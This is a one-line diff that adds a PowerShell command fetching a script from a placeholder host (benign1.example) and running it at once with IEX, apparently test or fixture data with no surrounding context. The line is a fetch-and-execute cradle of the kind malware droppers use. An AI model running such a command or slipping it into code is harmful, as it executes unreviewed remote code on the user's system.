@@ -1,0 +1,1 @@
+IEX (New-Object Net.WebClient).DownloadString('http://benign1.example/x.ps1')
